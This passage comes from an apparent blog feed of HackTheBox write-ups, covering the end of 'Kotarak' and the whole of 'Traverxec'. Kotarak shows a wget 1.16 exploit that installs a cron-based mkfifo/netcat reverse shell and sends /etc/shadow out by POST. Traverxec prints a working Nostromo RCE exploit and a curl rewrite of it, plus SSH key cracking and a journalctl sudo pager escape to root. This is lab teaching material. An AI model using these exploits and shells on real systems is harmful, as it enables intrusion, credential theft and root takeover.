<p>we own files in <code class="language-plaintext highlighter-rouge">/root</code>?</p>

<p><em>to confirm,</em> we run a <code class="language-plaintext highlighter-rouge">find</code> command and checked the files owned by us:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">flag.txt</code></li>
  <li><code class="language-plaintext highlighter-rouge">app.log</code></li>
</ul>

<p><img src="/assets/Kotarak/activity-detected.jpg" alt="" /></p>

<p><em>Looking above,</em> you can see a few things in the <code class="language-plaintext highlighter-rouge">app.log</code> file:</p>
<ol>
  <li>there’s <strong>another machine’s IP:</strong> 10.0.3.133</li>
  <li><em>looking at the dates, back in 2017 (when the box first came out),</em> it executed <code class="language-plaintext highlighter-rouge">wget</code> 3 times <em>-each 2 minutes apart-</em> to <strong>get a file</strong> called <code class="language-plaintext highlighter-rouge">archive.tar.gz</code> which it couldn’t get (it got a 404 not found)</li>
  <li>it was <strong>using an older version</strong> of <code class="language-plaintext highlighter-rouge">wget</code> (1.16)</li>
</ol>

<p>we make <strong>a couple of checks</strong> to see what’s going on:</p>
<ul>
  <li><strong>searching the file system</strong> for that <code class="language-plaintext highlighter-rouge">archive.tar.gz</code> and checking if we can see its contents.</li>
  <li><strong>pinging 10.0.3.133</strong> to see if it’s there.</li>
</ul>

<p><img src="/assets/Kotarak/understanding-app-log.jpg" alt="" /></p>

<p>we couldn’t find <code class="language-plaintext highlighter-rouge">archive.tar.gz</code>. But, <strong>the host 10.0.3.133 was there and responding to our pings!</strong></p>

<p>we look up <strong>exploit-db</strong> for that version of <code class="language-plaintext highlighter-rouge">wget</code> before moving on</p>

<p><img src="/assets/Kotarak/wget-searchsploit.jpg" alt="" /></p>

<p>there was actually an exploit for <code class="language-plaintext highlighter-rouge">wget</code>!</p>

<h2 id="elaborate-client-side-exploitation-and-privilege-escalation">Elaborate Client-Side Exploitation and Privilege Escalation</h2>
<p><strong>Client-Side attacks</strong> aren’t new. <em>But for some odd reason,</em> <strong>exploiting a command-line tool</strong> felt weird :D</p>

<p><em>Anyway,</em> we <strong>check out exploit’s details</strong> on <a href="https://www.exploit-db.com/exploits/40064">Exploit-db</a></p>

<p>It was a very interesting read. <em>To sum it up,</em> the scenario is:</p>
<ul>
  <li>if a victim is using <code class="language-plaintext highlighter-rouge">wget</code> 1.16 to download a file <strong>from a server that we control.</strong></li>
  <li><em>and</em> <code class="language-plaintext highlighter-rouge">wget</code> <em>was used</em> <strong><em>without an output being specified</em></strong> <em>(using the</em> <code class="language-plaintext highlighter-rouge">-O</code> <em>flag)</em>, it would <strong>save in the current working directory</strong>. which could potentially be <strong><em>the user’s home folder.</em></strong></li>
  <li><em>to exploit a situation like that,</em> we have to <strong>set up a web server</strong> that <strong>will respond with a redirect to an FTP server serving a malicious</strong> <code class="language-plaintext highlighter-rouge">.wgetrc</code> file.</li>
  <li>that file would then be <strong>saved to the victim’s home folder</strong> becoming <code class="language-plaintext highlighter-rouge">wget</code>’s main configuration. since <code class="language-plaintext highlighter-rouge">wget</code> would search for it there first.</li>
  <li>It would <strong>specify that upcoming downloads</strong> should have <code class="language-plaintext highlighter-rouge">/etc/cron.d/wget-root-shell</code> as their output location.</li>
  <li>that configuration would also have the client issue <strong>POST</strong> requests containing his <code class="language-plaintext highlighter-rouge">/etc/shadow</code>.</li>
  <li><em>If everything works, on the second request to our server,</em> the victim’s <code class="language-plaintext highlighter-rouge">/etc/shadow</code> would be there in the request body.</li>
  <li>And it would <strong>save our then-hosted reverse shell as a cron job</strong> called <code class="language-plaintext highlighter-rouge">wget-root-shell</code> in their <code class="language-plaintext highlighter-rouge">/etc/cron.d</code> folder.</li>
  <li><em>Having registered a</em> <code class="language-plaintext highlighter-rouge">cron</code> <em>job for that user,</em> we would <strong>get a reverse shell</strong> in the upcoming minute.</li>
</ul>

<p><strong>hopefully this would make more sense in demonstration below :D</strong></p>

<p><em>Alright, to perform this exploit,</em> we need to be able to <strong>serve a website on the machine on port 80</strong> and <strong>verify we’re still getting requests</strong> from a <strong>vulnerable</strong> <code class="language-plaintext highlighter-rouge">wget</code> <strong>web client.</strong></p>

<p><em>But,</em> access to ports below 1000 is only available for <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p>the only way around this is installing a tool called <code class="language-plaintext highlighter-rouge">authbind</code> (<em>which also requires</em> <code class="language-plaintext highlighter-rouge">root</code> <em>permission</em>).</p>

<p>let’s first check to see that tool was there or not.</p>

<p><img src="/assets/Kotarak/authbind-installed.jpg" alt="" /></p>

<p>it’s there! we’re now <strong>more confident</strong> of <strong>being on the right track</strong></p>

<p><em>with it,</em> we set up a <code class="language-plaintext highlighter-rouge">python</code> web server on port 80 and <strong>wait to detect any incoming web requests.</strong></p>

<p><img src="/assets/Kotarak/getting-an-http-request.jpg" alt="" /></p>

<p>We also check the python <code class="language-plaintext highlighter-rouge">pyftpdlib</code> module <strong>which we will need as our FTP server.</strong></p>

<p><em>And, if that wasn’t there,</em> we should be able to set it up on our kali and still be good.</p>

<p><img src="/assets/Kotarak/python-ftp-is-there.jpg" alt="" /></p>

<p>Great. let’s go!</p>

<h3 id="step-1-creating-the-evil-wgetrc-file">Step #1: Creating the evil .wgetrc file</h3>

<p>we set this up following the instructions on Exploit-DB</p>

<p><img src="/assets/Kotarak/exploit-db-wget-instructions.jpg" alt="" /></p>

<p><img src="/assets/Kotarak/wgetrc-created.jpg" alt="" /></p>

<p><em>Starting next step, since we’re going to do many things at the same time,</em> we will use <code class="language-plaintext highlighter-rouge">tmux</code> to <strong>split up our terminal.</strong></p>

<p><em>However, since we already use</em> <code class="language-plaintext highlighter-rouge">tmux</code> <em>on our kali,</em> we’re going <strong>to change the bind key</strong> to <strong>be able to interact with both</strong> <code class="language-plaintext highlighter-rouge">tmux</code> <strong>instances.</strong></p>

<p>here’s what the <code class="language-plaintext highlighter-rouge">~/.tmux.conf</code> file should look like:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set-option -g prefix C-a
set -g default-terminal "xterm-256color"
</code></pre></div></div>

<p>the second line is <strong>for preserving colors</strong> within <code class="language-plaintext highlighter-rouge">tmux</code> sessions. <em>Quality of life stuff xD</em></p>

<h3 id="step-2-getting-the-python-exploit-and-modifying-it">Step #2: Getting the python exploit and modifying it</h3>

<p><em>After fetching the exploit,</em> we have to <strong>modify a few lines</strong> to suit our needs.</p>

<p>Below is the <strong>default exploit code:</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HTTP_LISTEN_IP</span> <span class="o">=</span> <span class="s">'192.168.57.1'</span>
<span class="n">HTTP_LISTEN_PORT</span> <span class="o">=</span> <span class="mi">80</span>
<span class="n">FTP_HOST</span> <span class="o">=</span> <span class="s">'192.168.57.1'</span>
<span class="n">FTP_PORT</span> <span class="o">=</span> <span class="mi">21</span>

<span class="n">ROOT_CRON</span> <span class="o">=</span> <span class="s">"* * * * * root /usr/bin/id &gt; /root/hacked-via-wget </span><span class="se">\n</span><span class="s">"</span>
</code></pre></div></div>

<ul>
  <li>We’re going to <strong>listen on all interfaces with the web server</strong>. so we should set the <code class="language-plaintext highlighter-rouge">HTTP_LISTEN_IP</code> variable to <code class="language-plaintext highlighter-rouge">0.0.0.0</code>.</li>
  <li>The same <strong>wouldn’t work for the FTP server</strong>. because the victim <strong>must have our machine’s IP in the redirection</strong> to reach it.</li>
  <li><em>Finally,</em> we need to switch up the <code class="language-plaintext highlighter-rouge">/usr/bin/id &gt; /root/hacked-via-wget</code> cron job command to something more serious <strong><em>a.k.a. a reverse shell :D</em></strong></li>
</ul>

<p><em>After modification,</em> it should look like this:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HTTP_LISTEN_IP</span> <span class="o">=</span> <span class="s">'0.0.0.0'</span>
<span class="n">HTTP_LISTEN_PORT</span> <span class="o">=</span> <span class="mi">80</span>
<span class="n">FTP_HOST</span> <span class="o">=</span> <span class="s">'10.10.10.55'</span>
<span class="n">FTP_PORT</span> <span class="o">=</span> <span class="mi">21</span>

<span class="n">ROOT_CRON</span> <span class="o">=</span> <span class="s">"* * * * * root rm /tmp/pipe; mkfifo /tmp/pipe; /bin/sh -i &lt; /tmp/pipe 2&gt;&amp;1 | nc 10.10.10.55 9000 &gt; /tmp/pipe; rm /tmp/pipe </span><span class="se">\n</span><span class="s">"</span>
</code></pre></div></div>

<p>we use the <code class="language-plaintext highlighter-rouge">mkfifo</code> reverse shell because <strong>it works across many linux distros</strong> and <strong>has just been reliable :]</strong></p>

<p>and <strong>we’re making the 10.10.10.55 machine catch the shell</strong> because <strong>we’re not yet sure about our kali being reachable from 10.0.3.133.</strong></p>

<h3 id="step-3-receiving-the-first-wget">Step #3: Receiving the first wget</h3>

<p><em>A few moments after starting the FTP server and the</em> <code class="language-plaintext highlighter-rouge">python</code> <em>exploit,</em> we caught something.</p>

<p><img src="/assets/Kotarak/wget-exploit-and-ftp-together.jpg" alt="" /></p>

<p><em>if you look closely,</em> you would see <strong>the incoming request</strong> for <code class="language-plaintext highlighter-rouge">/archive.tar.gz</code> and <strong>the redirect being sent to FTP</strong> for the <code class="language-plaintext highlighter-rouge">.wgetrc</code> file.</p>

<h3 id="step-4-getting-the-shadow-file-and-deploying-the-evil-cron">Step #4: Getting the shadow file and deploying the evil cron</h3>

<p><em>Two more minutes after,</em> we <strong>get the POST request</strong> containing the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file.</p>

<p>That’s enough proof that our victim is the <code class="language-plaintext highlighter-rouge">root</code> user. <em>or at least one who can read the shadow file</em></p>

<p>The exploit now <strong>served the</strong> <code class="language-plaintext highlighter-rouge">cron</code> <strong>containing our reverse shell</strong> and <strong>it was downloaded by the victim</strong> to their <code class="language-plaintext highlighter-rouge">/etc/cron.d</code> directory.</p>

<p><img src="/assets/Kotarak/receiving-the-shadow-file-and-deploying-cron.jpg" alt="" /></p>

<h3 id="step-5-receiving-the-shell">Step #5: Receiving the Shell</h3>

<p><em>One minute after,</em> the <code class="language-plaintext highlighter-rouge">cron</code> job started and <strong>sent us back our root shell :D</strong></p>

<p><img src="/assets/Kotarak/rooted.jpg" alt="" /></p>

<p><strong>Just amazing :D</strong></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Linux - Easy] - Traverxec</title><link href="http://localhost:4000/2022/08/25/Traverxec.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Easy] - Traverxec" /><published>2022-08-25T00:00:00+02:00</published><updated>2022-08-25T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/25/Traverxec</id><content type="html" xml:base="http://localhost:4000/2022/08/25/Traverxec.html"><![CDATA[<p><img src="/assets/Traverxec/Traverxec.png" alt="" /></p>

<h2 id="summary">Summary</h2>
<ul>
  <li><strong>Traverxec</strong> is a <strong>Linux</strong> machine hosting a <strong>web server</strong> called <strong>Nostromo</strong> and has <strong>SSH</strong> port open.</li>
  <li>The <strong>response headers</strong> from the webserver <strong>reveal its name and version</strong> which happens to be <strong>vulnerable to a Remote Code Execution vulnerability.</strong></li>
  <li><em>After troubleshooting the exploit and making a few modifications,</em> we get <strong>a shell</strong> as the <code class="language-plaintext highlighter-rouge">www-data</code> user.</li>
  <li><em>One the box, when going through the files</em> <strong><em>in the webroot,</em></strong> we find the <strong>Nostromo server’s configuration file.</strong></li>
  <li>It reveals that there’s <strong>an accessible area</strong> within the <code class="language-plaintext highlighter-rouge">david</code> user’s <strong>home directory</strong>. <em>There,</em> we find a <strong>private SSH key</strong> which was <strong>protected by a passphrase.</strong></li>
  <li>We manage to <strong>crack it</strong> using <code class="language-plaintext highlighter-rouge">john</code> and are able to <strong>login as</strong> <code class="language-plaintext highlighter-rouge">david</code>.</li>
  <li><em>In</em> <code class="language-plaintext highlighter-rouge">david</code><em>’s home path</em>, we find a <strong>folder containing a Bash script</strong> that issues a <code class="language-plaintext highlighter-rouge">journalctl</code> command with <code class="language-plaintext highlighter-rouge">sudo</code> <strong>privileges</strong> without requiring a password. We <strong>exploit that to get a shell</strong> as <code class="language-plaintext highlighter-rouge">root</code>.</li>
</ul>

<hr />

<h2 id="nmap">NMAP</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-title: TRAVERXEC
|_http-server-header: nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<p><em>from</em> <code class="language-plaintext highlighter-rouge">nmap</code><em>’s output,</em> we notice from the <code class="language-plaintext highlighter-rouge">http-server-header</code> script that the web server is <strong>Nostromo version 1.9.6.</strong></p>

<p><em>but before we check for exploits,</em> we’ll first <strong>take a look at the website</strong> to see what’s there.</p>

<h2 id="the-website">The website</h2>
<p><img src="/assets/Traverxec/website-home-page.jpg" alt="" /></p>

<p><strong>static content</strong> for the most. Let’s move on :D</p>

<h2 id="searching-and-fixing-exploits">Searching and Fixing Exploits</h2>
<p>using <code class="language-plaintext highlighter-rouge">searchsploit</code> gets us <strong>two identical matches.</strong></p>

<p><img src="/assets/Traverxec/searchsploit.jpg" alt="" /></p>

<p><em>to go manual,</em> we pick the <strong>2nd Python script</strong> and <strong>look at the exploit code</strong> <em>(after removing the text art for clarity)</em></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="n">help_menu</span> <span class="o">=</span> <span class="s">'</span><span class="se">\r\n</span><span class="s">Usage: cve2019-16278.py &lt;Target_IP&gt; &lt;Target_Port&gt; &lt;Command&gt;'</span>

<span class="k">def</span> <span class="nf">connect</span><span class="p">(</span><span class="n">soc</span><span class="p">):</span>
    <span class="n">response</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">connection</span> <span class="o">=</span> <span class="n">soc</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">connection</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="k">break</span>
            <span class="n">response</span> <span class="o">+=</span> <span class="n">connection</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
    <span class="k">return</span> <span class="n">response</span>

<span class="k">def</span> <span class="nf">cve</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
    <span class="n">soc</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
    <span class="n">soc</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0</span><span class="se">\r\n</span><span class="s">Content-Length: 1</span><span class="se">\r\n\r\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">{} 2&gt;&amp;1'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="n">soc</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">receive</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">soc</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">receive</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>

        <span class="n">cve</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>

    <span class="k">except</span> <span class="nb">IndexError</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">help_menu</span><span class="p">)</span>
</code></pre></div></div>

<p>it seems straightforward. Just a <strong>TCP connection</strong> and a <strong>POST request</strong>. Let’s give it a try:</p>

<p><img src="/assets/Traverxec/exploit-error.jpg" alt="" /></p>

<p>we get <strong>an error</strong> when running the code :/ But we <em>shouldn’t worry</em> when we’ve got <strong>Google</strong> :)</p>

<p>we search <strong>using the error message as a query</strong>. To find this answer on <a href="https://stackoverflow.com/questions/33054527/typeerror-a-bytes-like-object-is-required-not-str-when-writing-to-a-file-in">Stack Overflow</a>:</p>

<p><img src="/assets/Traverxec/stack-overflow-answer.jpg" alt="" /></p>

<p><em>following that,</em> we <strong>modify the code</strong> accordingly</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">cve</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
    <span class="n">soc</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
    <span class="n">soc</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">target</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0</span><span class="se">\r\n</span><span class="s">Content-Length: 1</span><span class="se">\r\n\r\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">echo</span><span class="se">\n</span><span class="s">{} 2&gt;&amp;1'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
    <span class="n">soc</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>  <span class="c1"># previously soc.send(payload)
</span>    <span class="n">receive</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">soc</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">receive</span><span class="p">)</span>
</code></pre></div></div>

<p>then <strong>rerun the exploit</strong></p>

<p><img src="/assets/Traverxec/no-feedback-exploit.jpg" alt="" /></p>

<p><strong>no feedback</strong> at all this time xD</p>

<p><em>But,</em> <strong><em>no feedback doesn’t necessarily mean no effect</em></strong></p>

<p><em>for blind situations like these</em>: it’s good to use something like <code class="language-plaintext highlighter-rouge">wget</code> to <strong>verify code execution.</strong></p>

<p><img src="/assets/Traverxec/code-execution-verified.jpg" alt="" /></p>

<p><strong>we’re good :D</strong> let’s get in with a <strong>netcat reverse shell.</strong></p>

<p><img src="/assets/Traverxec/got-shell.jpg" alt="" /></p>

<p><em>before going any further,</em> it’s nice to <strong>improve our shell</strong>. it’s done in the below steps:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># With whatever Python version you find, import the pty module and spawn a bash pty</span>
python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span> <span class="o">||</span> python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
<span class="c"># Press CTRL + Z</span>
<span class="nb">stty </span>raw <span class="nt">-echo</span>
<span class="nb">fg</span>
<span class="c"># Press Enter twice</span>
<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash <span class="o">&amp;&amp;</span> <span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
<span class="c"># that's the size that fits my terminal. you can find yours with "stty size"</span>
<span class="nb">stty </span>rows 51 columns 228
</code></pre></div></div>

<h2 id="the-nostromo-config-file">The Nostromo config file</h2>
<p><em>Right after logging in,</em> we go into <code class="language-plaintext highlighter-rouge">/var/nostromo</code> and find a <strong>configuration file</strong> in the <code class="language-plaintext highlighter-rouge">conf</code> folder.</p>

<p><img src="/assets/Traverxec/nostromo-conf.jpg" alt="" /></p>

<p>A <strong>couple of interesting things</strong> show up:</p>
<ul>
  <li>a username: <code class="language-plaintext highlighter-rouge">david</code></li>
  <li>an <code class="language-plaintext highlighter-rouge">.htpasswd</code> file</li>
  <li>and a section on <code class="language-plaintext highlighter-rouge">HOMEDIRS</code></li>
</ul>

<p><code class="language-plaintext highlighter-rouge">david</code> was a <strong>local user</strong> on the system</p>

<p><img src="/assets/Traverxec/david-passwd.jpg" alt="" /></p>

<p>the <code class="language-plaintext highlighter-rouge">.htpasswd</code> file contains a hash. we <strong>cracked it</strong> with <code class="language-plaintext highlighter-rouge">john</code> and got a password:</p>

<p><img src="/assets/Traverxec/htpasswd-cracked.jpg" alt="" /></p>

<p>But that password <em>didn’t work</em> for either <code class="language-plaintext highlighter-rouge">root</code> or <code class="language-plaintext highlighter-rouge">david</code>.</p>

<p><img src="/assets/Traverxec/no-cred-reuse-for-htpassword.jpg" alt="" /></p>

<p>we keep it around just in case..</p>

<h2 id="understanding-the-homedirs-feature">Understanding the HOMEDIRS feature</h2>
<p><em>previously,</em> we attempted to list the contents of <code class="language-plaintext highlighter-rouge">david</code>’s profile but got denied access.</p>

<p><img src="/assets/Traverxec/david-perm-denied.jpg" alt="" /></p>

<p><em>since the</em> <code class="language-plaintext highlighter-rouge">HOMEDIRS</code> <em>feature would give us access into</em> <code class="language-plaintext highlighter-rouge">david</code><em>’s directory,</em> we take <strong>a quick look</strong> at the <a href="https://www.nazgul.ch/dev/nostromo_man.html">online documentation</a> to understand how to use it:</p>

<p><strong>note:</strong> <em>to make the page clearer for reading,</em> you may <strong>edit the CSS</strong> for the man page using the <strong>Chrome Dev Tools.</strong></p>

<p><img src="/assets/Traverxec/editing-site-css-for-clarity.jpg" alt="" /></p>

<p><em>Scrolling down to the</em> <code class="language-plaintext highlighter-rouge">HOMEDIRS</code> <em>section,</em> we find an example showing that <strong>we can access a user’s folder over HTTP</strong> using the <code class="language-plaintext highlighter-rouge">~</code> followed by the <code class="language-plaintext highlighter-rouge">username</code>.</p>

<p>another thing is: users <strong>can define a certain directory to be shared</strong> through the <code class="language-plaintext highlighter-rouge">homedirs_public</code> option.</p>

<p><img src="/assets/Traverxec/homedirs_explained.jpg" alt="" /></p>

<p>we saw that one in <code class="language-plaintext highlighter-rouge">nhttpd.conf</code></p>

<p><img src="/assets/Traverxec/public_www.jpg" alt="" /></p>

<p>let’s first check the home directory <strong><em>from the outside</em></strong></p>

<p><img src="/assets/Traverxec/home-dir-website.jpg" alt="" /></p>

<p>there’s nothing in both the <strong>web page</strong> and the <strong>source code.</strong></p>

<p>a <code class="language-plaintext highlighter-rouge">gobuster</code> <strong>brute force</strong> didn’t get us anything new either.</p>

<p><em>Locally on the file system, since the</em> <code class="language-plaintext highlighter-rouge">public_www</code> <em>folder</em> <strong>should be</strong> <em>in</em> <code class="language-plaintext highlighter-rouge">david</code><em>’s home directory,</em> we tried to <strong><em>blindly</em></strong> change into it.</p>

<p><img src="/assets/Traverxec/public_www-violated.jpg" alt="" /></p>

<p><strong>it worked!</strong> plus we found something that could give us access.</p>

<p>we <strong>copied the archive</strong> to <code class="language-plaintext highlighter-rouge">/tmp</code> where we <strong>extracted</strong> it. <em>Inside,</em> we found a <strong>protected</strong> <code class="language-plaintext highlighter-rouge">id_rsa</code> that we need to crack:</p>

<p><img src="/assets/Traverxec/id_rsa_found.jpg" alt="" /></p>

<p>we first <strong>convert</strong> it to a hash using <code class="language-plaintext highlighter-rouge">ssh2john</code> and <strong>crack it</strong> using <code class="language-plaintext highlighter-rouge">john</code> to get a password: “hunter”</p>

<p><img src="/assets/Traverxec/id_rsa_cracked.jpg" alt="" /></p>

<p>we later <strong>change the permissions</strong> on the SSH key (<code class="language-plaintext highlighter-rouge">chmod 600 &lt;KEY_FILE&gt;</code>) and use it to access the machine as <code class="language-plaintext highlighter-rouge">david</code></p>

<p><img src="/assets/Traverxec/ssh-as-david.jpg" alt="" /></p>

<h2 id="exploiting-sudo-journalctl-for-privesc">Exploiting SUDO journalctl for Privesc</h2>
<p><em>Right after logging in,</em> we see <strong>a folder that sticks out</strong>: <code class="language-plaintext highlighter-rouge">bin</code></p>

<p>it had a script <code class="language-plaintext highlighter-rouge">server-status.sh</code> and another file called <code class="language-plaintext highlighter-rouge">server-stats.head</code></p>

<p><img src="/assets/Traverxec/bin-folder-plus-script.jpg" alt="" /></p>

<p>looking at their contents:</p>

<p><img src="/assets/Traverxec/bin-files-breakdown.jpg" alt="" /></p>

<p>the <code class="language-plaintext highlighter-rouge">server-stats.head</code> was just <strong>ASCII art.</strong></p>

<p>But, within <code class="language-plaintext highlighter-rouge">server-status.sh</code> are all <strong>commands for checking the status of the Nostromo server</strong> <em>just like the name says</em></p>

<p>the <strong>exploitable part</strong> here is the <code class="language-plaintext highlighter-rouge">sudo</code> command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/sudo /usr/bin/journalctl <span class="nt">-n5</span> <span class="nt">-unostromo</span>.service
</code></pre></div></div>

<p>that’s because <code class="language-plaintext highlighter-rouge">journalctl</code> <strong><em>can be escaped for a shell with the same privileges</em></strong>.</p>

<p>A quick look on <a href="https://gtfobins.github.io/gtfobins/journalctl/#sudo">GTFOBins</a> can confirm that.</p>

<p><img src="/assets/Traverxec/gtfo-bins-journalctl.jpg" alt="" /></p>

<p>the trick is that it <strong><em>“invokes the default pager”.</em></strong></p>

<p>A pager is a <strong>program</strong> that <strong>helps the user view the output of a command</strong> <strong><em>one page at a time</em></strong>.
This is done by <strong>getting the size of rows of the terminal</strong> and <strong>only displaying that many lines.</strong></p>

<p>Paging tools you’re probably familiar with are <code class="language-plaintext highlighter-rouge">more</code> and <code class="language-plaintext highlighter-rouge">less</code>. Both of which can be <strong><em>escaped for a shell</em></strong> ;]</p>

<p>Let’s first <strong>run the script</strong> to see <em>if it asks for a password or not.</em></p>

<p><img src="/assets/Traverxec/script-test-run.jpg" alt="" /></p>

<p>It ran <strong><em>without prompting us for authentication.</em></strong></p>

<p>That’s good. the command <code class="language-plaintext highlighter-rouge">/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code> is available for <code class="language-plaintext highlighter-rouge">david</code> without him needing to provide a password.</p>

<p><em>To exploit this,</em> we run the command. <strong><em>But because the output is too small,</em></strong> <strong>the pager isn’t called.</strong></p>

<p><img src="/assets/Traverxec/no-pager-invoked.jpg" alt="" /></p>

<p>We use <code class="language-plaintext highlighter-rouge">stty</code> as a quick-and-dirty trick to <strong>shrink our tty.</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>rows 20 columns 20
</code></pre></div></div>

<p><img src="/assets/Traverxec/pager-invoked.jpg" alt="" /></p>

<p><em>From the highlighted line,</em> we know <strong>we have a pager</strong> which can be <strong>turned into a bash shell</strong> with <code class="language-plaintext highlighter-rouge">!/bin/bash</code></p>

<p><img src="/assets/Traverxec/rooted.jpg" alt="" /></p>

<p><strong>Owned :D</strong></p>

<h2 id="rewriting-the-nostromo-exploit">Rewriting the Nostromo exploit</h2>
<p><em>After some brief testing, and</em> <strong><em>for the sake of simplicity,</em></strong> we <strong>re-wrote the the exploit</strong> for Nostromo as a <code class="language-plaintext highlighter-rouge">curl</code> one-liner:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> <span class="s1">$'POST'</span> <span class="se">\</span>
<span class="nt">-H</span> <span class="s1">$'Content-Length: 1'</span> <span class="se">\</span>
<span class="nt">--data-binary</span> <span class="s1">$'</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0aecho</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0aecho</span><span class="se">\x</span><span class="s1">0d</span><span class="se">\x</span><span class="s1">0a&lt;COMMAND&gt;'</span> <span class="se">\</span>
<span class="s1">$'http://&lt;HOSTNAME&gt;:&lt;PORT&gt;/.%0d./.%0d./.%0d./.%0d./bin/sh'</span> <span class="o">&gt;</span>/dev/null
</code></pre></div></div>

